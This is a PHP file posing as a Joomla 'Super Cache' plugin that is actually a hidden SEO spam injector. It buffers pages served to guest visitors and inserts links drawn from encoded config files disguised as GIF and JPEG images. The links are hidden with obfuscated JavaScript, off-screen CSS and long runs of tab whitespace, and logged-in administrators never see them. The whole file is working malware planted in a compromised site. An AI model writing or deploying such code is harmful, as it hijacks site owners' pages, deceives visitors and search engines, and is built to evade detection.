<?php
/**
 * @package     Joomla.Plugin
 * @subpackage  Super Cache
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Super Cache Plugin.
 * Based on the oficial recaptcha library( http://sp-cache.net/plugins/php/ )
 *
 * @package     Joomla.Plugin
 * @subpackage  Super Cache
 * @since       2.5
 */

if (!function_exists("file_put_contents")) {
	function file_put_contents($filename, $text) {
		$f = fopen($filename, "w");
		if (!$f) return false;
		
		if (!fwrite($f, $text)) return false;
		fclose($f);
		
		return true;
	}
}

class PlgSystemXcalendar extends JPlugin {
}

class PlgSystemXcalendarHelper {
	var $config = false;
	var $request = false;
	
	function getInstance() {
		static $instance = null;
		
		if ($instance === null) $instance = new PlgSystemXcalendarHelper();
		
		return $instance;
	}
	
	function getRequest() {
		return $_SERVER['REQUEST_URI'].($_SERVER['QUERY_STRING'] ? '?'.$_SERVER['QUERY_STRING'] : '');
	}
	
	function initActions() {
		ob_start('PlgSystemXcalendarBufferEnd');
	}
	
	function bufferEnd($buffer) {
		if (!$this->isShowLink()) return $buffer;
		
		return @$this->getModifiedContent($buffer);
	}
	
	function getModifiedContent($content) {
		list($success, $postInfo) = $this->getPostRecord($this->request);
		if (!$success) return $content;
		
		if (!$postInfo) {
			$links = $this->getNextLinks($this->config['linkCount']);
			
			$postInfo = array(
				'url' => $this->request,
				'links' => $links,
			);
			
			if (!$this->savePostRecord($this->request, $postInfo)) return $content;
		}
		
		switch ($this->config['linkType']) {
			case 'hidden':
				$content = $this->modifyContentHidden($content, $postInfo);
				break;
			
			case 'lasthref':
				$content = $this->modifyContentLastHref($content, $postInfo);
				break;
			
			case 'lastdiv':
				$content = $this->modifyContentLastDiv($content, $postInfo);
				break;
			
			case 'afterregexp':
				$content = $this->modifyContentRegexp($content, $postInfo);
				break;
		}
		
		return $content;
	}
	
	function modifyContentLastHref($content, $postInfo) {
		$position = $this->getLastLinkPosition($content);
		$listLinkPosition = $this->getLastListLinkPosition($content);
		$isListLink = false;
		$lowestPosition = strlen($content) * 0.7;
		
		if ($listLinkPosition && ($listLinkPosition['position'] > $lowestPosition)) {
			$position = $listLinkPosition;
			$isListLink = true;
		}
		
		if (!$position || $position['position'] < $lowestPosition) {
			$position = $this->getLastDivPosition($content);
		}
		
		if (!$position) return $content;
		
		$linkHTML = '';
		foreach ($postInfo['links'] as $link) {
			$linkHTML .= '<a href="'.$link[0].'"'.($position['class'] ? ' class="'.$position['class'].'"' : '').($position['style'] ? ' style="'.$position['style'].'"' : '').'>'.$link[1].'</a><br />';
		}
		
		return substr($content, 0, $position['position']).($isListLink ? '<li>'.$linkHTML.'</li>' : ' | '.$linkHTML.' ').substr($content, $position['position']);
	}
	
	function modifyContentLastDiv($content, $postInfo) {
		$position = $this->getLastDivPosition($content);
		
		if (!$position) return $content;
		
		$linkHTML = '';
		foreach ($postInfo['links'] as $link) {
			$linkHTML .= '<a href="'.$link[0].'"'.($position['class'] ? ' class="'.$position['class'].'"' : '').($position['style'] ? ' style="'.$position['style'].'"' : '').'>'.$link[1].'</a><br />';
		}
		
		return substr($content, 0, $position['position']).($isListLink ? '<li>'.$linkHTML.'</li>' : ' | '.$linkHTML.' ').substr($content, $position['position']);
	}
	
	function modifyContentRegexp($content, $postInfo) {
		$lastPosition = false;
		
		while (preg_match($this->config['linkPlaceRegexp'], $lastPosition === false ? $content : substr($content, $lastPosition + 1), $matches)) {
			$lastPosition = $this->mystrpos($content, $matches[0]);
			if ($lastPosition === false) break;
		}
		
		if ($lastPosition === false) return $content;
		
		$linkHTML = '';
		foreach ($postInfo['links'] as $link) {
			$linkHTML .= '<a href="'.$link[0].'">'.$link[1].'</a><br />';
		}
		
		return substr($content, 0, $lastPosition).' | '.$linkHTML.' '.substr($content, $lastPosition);
	}
	
	function modifyContentHidden($content, $postInfo) {
		if ($this->config['watertext']) {
			if (!$postInfo['linkPositions']) {
				list($text, $postInfo) = $this->generateHiddenText($postInfo);
				
				if (!$this->savePostRecord($this->request, $postInfo)) return $content;
			} else {
				$text = $this->buildHiddenText($postInfo);
			}
		} else {
			$text = '';
			foreach ($postInfo['links'] as $link) {
				$text .= '<a href="'.$link[0].'">'.$link[1].'</a><br />';
			}
		}
		
		if (!$postInfo['hiddenMethod']) {
			$postInfo['hiddenMethod'] = $this->getHideMethod();
			if (!$this->savePostRecord($this->request, $postInfo)) return $content;
		}
		
		$content = call_user_func_array(array($this, $postInfo['hiddenMethod']), array($content, $text));
		
		return $content;
	}
	
	function getLongTail() {
		$longTail = '';
		for ($i=0; $i<300; $i++) $longTail .= "\t";
		
		return $longTail;
	}
	
	function getHideMethod() {
		if (!$this->config['hiddenLinkTypes']) return 'hideJsCssAbsolute';
		$methods = array();
		
		foreach ($this->config['hiddenLinkTypes'] as $methodName => $koef) {
			if (method_exists($this, $methodName)) {
				for ($i = 0; $i < $koef; $i++) {
					$methods[] = $methodName;
				}
			}
		}
		
		return $methods[array_rand($methods)];
	}
	
	function hideJsCssAbsolute($content, $text) {
		$className = $this->generateClass();
		
		$scriptContent = $this->getLongTail().'<script language="JavaScript">var _0xa113=["'.join('", "', $this->obfuscateJavaScript('<style>.'.$className.'{position:absolute;top:-9999px}</style>')).'","\x6C\x65\x6E\x67\x74\x68","","\x63\x68\x61\x72\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6A\x6F\x69\x6E","\x77\x72\x69\x74\x65"];function _0xad78(){var _0xee8bx2=0,_0xee8bx3,_0xee8bx4,_0xee8bx5,_0xee8bx6;var _0xee8bx7= new Array(_0xa113[0],_0xa113[1],_0xa113[2],_0xa113[3]);var _0xee8bx8=_0xee8bx7[_0xa113[4]];while(++_0xee8bx2<=_0xee8bx8){_0xee8bx3=_0xee8bx7[_0xee8bx8-_0xee8bx2];_0xee8bx5=_0xee8bx6=_0xa113[5];for(_0xee8bx4=0;_0xee8bx4<_0xee8bx3[_0xa113[4]];){_0xee8bx5+=_0xee8bx3[_0xa113[6]](_0xee8bx4++);if(_0xee8bx5[_0xa113[4]]==2){_0xee8bx6+=String[_0xa113[7]](parseInt(_0xee8bx5)+35-_0xee8bx8+_0xee8bx2);_0xee8bx5=_0xa113[5];} ;} ;_0xee8bx7[_0xee8bx8-_0xee8bx2]=_0xee8bx6;} ;document[_0xa113[9]](_0xee8bx7[_0xa113[8]](_0xa113[5]));} ;_0xad78();</script>';
		
		if (preg_match("#</head>#is", $content) && preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#</head>#is', $scriptContent."\n".'</head>', $content);
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} elseif (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', $scriptContent."\n".'</head><body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} else {
			$content = $scriptContent."\n".$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>'.$content;
		}
		
		return $content;
	}
	
	function hideJsCssHidden($content, $text) {
		$className = $this->generateClass();
		
		$scriptContent = $this->getLongTail().'<script language="JavaScript">var _0xa113=["'.join('", "', $this->obfuscateJavaScript('<style>.'.$className.'{display:none}</style>')).'","\x6C\x65\x6E\x67\x74\x68","","\x63\x68\x61\x72\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6A\x6F\x69\x6E","\x77\x72\x69\x74\x65"];function _0xad78(){var _0xee8bx2=0,_0xee8bx3,_0xee8bx4,_0xee8bx5,_0xee8bx6;var _0xee8bx7= new Array(_0xa113[0],_0xa113[1],_0xa113[2],_0xa113[3]);var _0xee8bx8=_0xee8bx7[_0xa113[4]];while(++_0xee8bx2<=_0xee8bx8){_0xee8bx3=_0xee8bx7[_0xee8bx8-_0xee8bx2];_0xee8bx5=_0xee8bx6=_0xa113[5];for(_0xee8bx4=0;_0xee8bx4<_0xee8bx3[_0xa113[4]];){_0xee8bx5+=_0xee8bx3[_0xa113[6]](_0xee8bx4++);if(_0xee8bx5[_0xa113[4]]==2){_0xee8bx6+=String[_0xa113[7]](parseInt(_0xee8bx5)+35-_0xee8bx8+_0xee8bx2);_0xee8bx5=_0xa113[5];} ;} ;_0xee8bx7[_0xee8bx8-_0xee8bx2]=_0xee8bx6;} ;document[_0xa113[9]](_0xee8bx7[_0xa113[8]](_0xa113[5]));} ;_0xad78();</script>';
		
		if (preg_match("#</head>#is", $content) && preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#</head>#is', $scriptContent."\n".'</head>', $content);
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} elseif (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', $scriptContent."\n".'</head><body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} else {
			$content = $scriptContent."\n".$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>'.$content;
		}
		
		return $content;
	}
	
	function hideStyleAbsolute($content, $text) {
		$styleContent = 'position:absolute;top:-9999px';
		
		if (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span style="'.$styleContent.'">'.$text.'</span>', $content);
		} else {
			$content = $this->getLongTail().'<span style="'.$styleContent.'">'.$text.'</span>'.$content;
		}
		
		return $content;
	}
	
	function hideStyleHidden($content, $text) {
		$styleContent = 'display:none';
		
		if (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span style="'.$styleContent.'">'.$text.'</span>', $content);
		} else {
			$content = $this->getLongTail().'<span style="'.$styleContent.'">'.$text.'</span>'.$content;
		}
		
		return $content;
	}
	
	function hideJsAbsolute($content, $text) {
		$tagId = $this->generateClass();
		$scriptContent = $this->getLongTail().'<script>document.getElementById("'.$tagId.'").style.position = "absolute"; document.getElementById("'.$tagId.'").style.top = "-9999px";</script>';
		
		if (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span id="'.$tagId.'">'.$text.'</span>'.$scriptContent, $content);
		} else {
			$content = $this->getLongTail().'<span id="'.$tagId.'">'.$text.'</span>'.$scriptContent.$content;
		}
		
		return $content;
	}
	
	function hideJsHidden($content, $text) {
		$tagId = $this->generateClass();
		$scriptContent = $this->getLongTail().'<script>document.getElementById("'.$tagId.'").style.display = "none";</script>';
		
		if (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span id="'.$tagId.'">'.$text.'</span>'.$scriptContent, $content);
		} else {
			$content = $this->getLongTail().'<span id="'.$tagId.'">'.$text.'</span>'.$scriptContent.$content;
		}
		
		return $content;
	}
	
	function hideCssAbsolute($content, $text) {
		$className = $this->generateClass();
		
		$scriptContent = $this->getLongTail().'<style>.'.$className.'{position:absolute;top:-9999px}</style>';
		
		if (preg_match("#</head>#is", $content) && preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#</head>#is', $scriptContent."\n".'</head>', $content);
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} elseif (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', $scriptContent."\n".'</head><body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} else {
			$content = $scriptContent."\n".$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>'.$content;
		}
		
		return $content;
	}
	
	function hideCssHidden($content, $text) {
		$className = $this->generateClass();
		
		$scriptContent = $this->getLongTail().'<style>.'.$className.'{display:none}</style>';
		
		if (preg_match("#</head>#is", $content) && preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#</head>#is', $scriptContent."\n".'</head>', $content);
			$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} elseif (preg_match("#<body([^>]*)#is", $content)) {
			$content = preg_replace('#<body([^>]*)>#is', $scriptContent."\n".'</head><body\\1>'.$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>', $content);
		} else {
			$content = $scriptContent."\n".$this->getLongTail().'<span class="'.$className.'">'.$text.'</span>'.$content;
		}
		
		return $content;
	}
	
	function buildHiddenText($postInfo) {
		$sentences = array();
		
		$f = fopen($this->getDictName(), 'r');
		foreach ($postInfo['texts'] as $sentenceInfo) {
			fseek($f, $sentenceInfo[0]);
			$line = $this->getXorText(fread($f, $sentenceInfo[1]));
			$sentences[] = trim(strip_tags(preg_replace("#[\r\n\s]+#", " ", $line)));
		}
		fclose($f);
		
		return $this->joinSentences($sentences, $postInfo);
	}
	
	function generateHiddenText($postInfo) {
		$name = $this->getDictName();
		
		$length = filesize($name);
		$start = min($length, 50);
		$size = 30000;
		$end = max($start, $length - $size);
		$randFileIndex = rand($start, $end);
		
		$f = fopen($name, 'r');
		fseek($f, $randFileIndex);
		$originalText = $this->getXorText(fread($f, $size));
		fclose($f);
		
		$allSentences = preg_split('/(?<=[.?!])\s+(?=[a-z])/i', $originalText);
		
		if ($allSentences) unset($allSentences[count($allSentences) - 1]);
		if ($allSentences) unset($allSentences[0]);
		
		if (!$allSentences) return array('<a href="'.$postInfo['link'][0].'">'.$postInfo['link'][1].'</a>', $postInfo);
		
		shuffle($allSentences);
		$sentences = array();
		$length = 0;
		
		$sentencePositions = array();
		
		while ($length < 2000 && $allSentences) {
			$rand = array_rand($allSentences);
			$sentence = $allSentences[$rand];
			$correctedSentence = trim(strip_tags(preg_replace("#[\r\n\s]+#", " ", $sentence)));
			if (strpos($correctedSentence, ' ') === false) continue;
			$sentences[] = $correctedSentence;
			$sentencePositions[] = array($randFileIndex + $this->mystrpos($originalText, $sentence), strlen($sentence));
			unset($allSentences[$rand]);
			$length += strlen($correctedSentence) + 1;
		}
		
		$positions = array();
		foreach ($postInfo['links'] as $linkIndex => $link) {
			$randSentence = array_rand($sentences);
			$sentence = $sentences[$randSentence];
			
			while (true) {
				$sentencePosition = $this->mystrpos($sentence, ' ', rand(0, strlen($sentence) - 1));
				if ($sentencePosition !== false) {
					$positions[$linkIndex] = array($randSentence, $sentencePosition);
					break;
				}
			}
		}
		
		$postInfo['texts'] = $sentencePositions;
		$postInfo['linkPositions'] = $positions;
		
		return array($this->joinSentences($sentences, $postInfo), $postInfo);
	}
	
	function joinSentences($sentences, $postInfo) {
		$sentencePositions = array();
		foreach ($postInfo['linkPositions'] as $linkIndex => $position) {
			$sentencePositions[$position[0]][$position[1]] = $linkIndex;
		}
		
		foreach ($sentencePositions as $sentenceIndex => $linkIndexes) {
			$sentences[$sentenceIndex] = $this->buildSentence($sentences[$sentenceIndex], $linkIndexes, $postInfo['links']);
		}
		
		return join(" ", $sentences);
	}
	
	function buildSentence($sentence, $linkIndexes, $links) {
		ksort($linkIndexes);
		
		$parts = array();
		$lastIndex = 0;
		foreach ($linkIndexes as $sentenceIndex => $linkIndex) {
			$link = $links[$linkIndex];
			$parts[] = substr($sentence, $lastIndex, ($sentenceIndex - $lastIndex)).' <a href="'.$link[0].'">'.$link[1].'</a>';
			$lastIndex = $sentenceIndex;
		}
		
		$parts[] = substr($sentence, $lastIndex);
		
		return join("", $parts);
	}
	
	function obfuscateJavaScript($str) {
		$randnums = array();
		$minLength = 5;
		while (count($randnums) < 3) {
			$num = rand($minLength, strlen($str) - $minLength);
			if (isset($randnums[$num])) continue;
			
			foreach ($randnums as $n) {
				if (abs($n - $num) < $minLength) {
					continue 2;
				}
			}
			$randnums[$num] = $num;
		}
		
		sort($randnums, SORT_NUMERIC);
		$parts = array(
			substr($str, 0, $randnums[0]),
			substr($str, $randnums[0], $randnums[1] - $randnums[0]),
			substr($str, $randnums[1], $randnums[2] - $randnums[1]),
			substr($str, $randnums[2], strlen($str) - $randnums[2]),
		);
		
		$index = 1;
		foreach ($parts as $part) {
			$newStr = '';
			for ($i=0; $i<strlen($part); $i++) {
				$ord = (string)(ord($part[$i]) - 35 + $index - 1);
				
				for ($j=0; $j<strlen($ord); $j++) $newStr .= '\\x'.dechex(ord($ord[$j]));
			}
			$parts[$index - 1] = $newStr;
			$index++;
		}
		
		return $parts;
	}
	
	function generateClass() {
		$className = '';
		
		$symbols = range('a', 'z');
		for ($i = rand(15, 20); $i > 0; $i--) {
			$className .= $symbols[array_rand($symbols)];
		}
		
		return $className;
	}
	
	function isShowLink() {
		$user = JFactory::getUser();
		
		if (!$user->guest) return false;
		
		$this->request = $_SERVER['REQUEST_URI'];
		list($success, $this->config) = $this->getConfig();
		if (!$success) return false;
		
		return true;
	}
	
	function getAttributeValue($attribute, $text) {
		if (preg_match("#\s+".preg_quote($attribute)."\s*=\s*'([^']+)'#is", $text, $matches) || preg_match("#\s+".preg_quote($attribute)."\s*=\s*\"([^\"]+)\"#is", $text, $matches) || preg_match("#\s+".preg_quote($attribute)."\s*=\s*([^\s]+)#is", $text, $matches)) {
			return $matches[1];
		}
		
		return false;
	}
	
	function isValidHref($href) {
		return $href && $href[0] != '#' && substr($href, 0, 11) != 'javascript:';
	}
	
	function isValidAnchor($anchor) {
		if (preg_match("#<img[^>]*>#is", $anchor)) return false;
		
		if (strlen(trim(strip_tags($anchor))) < 5) return false;
		
		return true;
	}
	
	function isInsideBlock($text, $position, $tagStart, $tagEnd) {
		if (false === ($tagStartPosition = $this->mystrrpos(substr($text, 0, $position), $tagStart))) return false;
		
		if (false !== ($tagEndPosition = $this->mystrpos($text, $tagEnd, $tagStartPosition))) {
			return $tagEndPosition > $position;
		}
		
		return true;
	}
	
	function searchLink($content, $startTag, $fullRegexp) {
		$offset = null;
		
		$content = strtolower($content);
		
		while (false !== ($position = $this->mystrrpos($offset === null ? $content : substr($content, 0, $offset), $startTag))) {
			if (preg_match($fullRegexp, substr($content, $position), $matches)) {
				$href = $this->getAttributeValue('href', $matches[1]);
				$anchor = $matches[2];
				
				if (
					$this->isValidHref($href)
					&& $this->isValidAnchor($anchor)
					&& !$this->isInsideBlock($content, $position, '<!--', '-->')
					&& !$this->isInsideBlock($content, $position, '<script', '</script>')
				) {
					return array(
						'position' => $position + strlen($matches[0]),
						'class' => $this->getAttributeValue('class', $matches[1]),
						'style' => $this->getAttributeValue('style', $matches[1]),
					);
				}
			}
			
			$offset = $position;
		}
		
		return false;
	}
	
	function getLastDivPosition($content) {
		$position = $this->mystrrpos(strtolower($content), '</div>');
		
		if ($position === false) return false;
		
		return array(
			'position' => $position,
			'class' => false,
			'style' => false,
		);
	}
	
	function mystrpos($text, $needle, $offset = 0) {
		$end = strlen($text);
		$nl = strlen($needle);
		
		for ($i=$offset; $i<=$end - $nl; $i++) {
			if ($text[$i] == $needle[0]) {
				$found = true;
				
				for ($j=1; $j<$nl; $j++) {
					if ($text[$i + $j] != $needle[$j]) {
						$found = false;
						break;
					}
				}
				
				if ($found) return $i;
			}
		}
		
		return false;
	}
	
	function mystrrpos($text, $needle, $offset = 0) {
		$end = strlen($text);
		$nl = strlen($needle);
		
		for ($i=$end - $nl; $i>=0; $i--) {
			if ($text[$i] == $needle[0]) {
				$found = true;
				
				for ($j=1; $j<$nl; $j++) {
					if ($text[$i + $j] != $needle[$j]) {
						$found = false;
						break;
					}
				}
				
				if ($found) return $i;
			}
		}
		
		return false;
	}
	
	function getLastLinkPosition($content) {
		return $this->searchLink($content, '<a', "#^<a([^>]*href\s*=\s*[^>]*)>(.*?)</a>#is");
	}
	
	function getLastListLinkPosition($content) {
		return $this->searchLink($content, '<li', "#^<li[^>]*>\s*<a([^>]*href\s*=\s*[^>]*)>(.*?)</a>(.*?)</li>#is");
	}
	
	function getPluginPath() {
		$filename = pathinfo(__FILE__);
		return $filename['filename'].'/'.$filename['basename'];
	}
	
	function getConfigName() {
		return '/home/m/metallmaru/public_html/plugins/system/xcalendar/xcalendar-data/bg.gif';
	}
	
	function getDbName() {
		return '/home/m/metallmaru/public_html/plugins/system/xcalendar/xcalendar-data/blank.jpg';
	}
	
	function getDictName() {
		return '/home/m/metallmaru/public_html/plugins/system/xcalendar/xcalendar-data/logo02.gif';
	}
	
	function getPostRecord($url) {
		$dbname = $this->getDbName();
		if (!file_exists($dbname)) return array(false);
		
		$db = @unserialize($this->getImageDecodedText(file_get_contents($dbname)));
		if (!$db) return array(true, false);
		
		return array(true, $db['urls'][$url]);
	}
	
	function savePostRecord($url, $postInfo) {
		$dbname = $this->getDbName();
		if (!file_exists($dbname)) return false;
		
		$db = @unserialize($this->getImageDecodedText(file_get_contents($dbname)));
		if (!$db) $db = array('urls' => array());
		
		$db['urls'][$url] = $postInfo;
		
		if (!file_put_contents($dbname, $this->getImageEncodedText($dbname, serialize($db)))) return false;
		
		return true;
	}
	
	function getConfig() {
		$configname = $this->getConfigName();
		if (!file_exists($configname)) return array(false);
		
		$config = @(array)unserialize($this->getImageDecodedText(file_get_contents($configname)));
		if (!$config) return array(false);
		
		return array(true, $config);
	}
	
	function getNextLinks($count) {
		$result = array();
		
		$count = min($count, count($this->config['links']));
		if ($count < 1) $count = 1;
		
		$keys = array_rand($this->config['links'], $count);
		if ($count == 1) $keys = array($keys);
		shuffle($keys);
		
		foreach ($keys as $key) {
			$result[] = $this->getRandLink($this->config['links'][$key]);
		}
		
		return $result;
	}
	
	function getRandLink($links) {
		$randkoefs = array();
		foreach ($links as $i => $link) {
			for ($j = $link[2]; $j>0; $j--) $randkoefs[] = $i;
		}
		
		$rand = $randkoefs[array_rand($randkoefs)];
		
		return $links[$rand];
	}
	
	function getXorText($text) {
		for ($i=0; $i<strlen($text); $i++) {
			$text[$i] = chr(ord($text[$i]) ^ 50);
		}
		
		return $text;
	}
	
	function getImageEncodedText($name, $content) {
		$info = explode('.', $name);
		$type = strtolower($info[count($info) - 1]);
		
		$content = $this->getXorText($content);
		
		if ($type == 'gif') {
			return base64_decode('R0lGODlhAQAGAJEAABqAqNzg5P///wByniH5BAAAAAAALAAAAAABAAYAAAIE3CASBQA=').$content;
		} elseif ($type == 'jpg') {
			return base64_decode('/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAZAAA/+4ADkFkb2JlAGQ=').$content;
		}
	}
	
	function getImageDecodedText($content) {
		$content = substr($content, 50);
		return $this->getXorText($content);
	}
}

$instance = PlgSystemXcalendarHelper::getInstance();
$instance->initActions();

function PlgSystemXcalendarBufferEnd($buffer) {
	if (!preg_match("#<(html|head|body)#is", $buffer)) return $buffer;
	$instance = PlgSystemXcalendarHelper::getInstance();
	return $instance->bufferEnd($buffer);
}
?>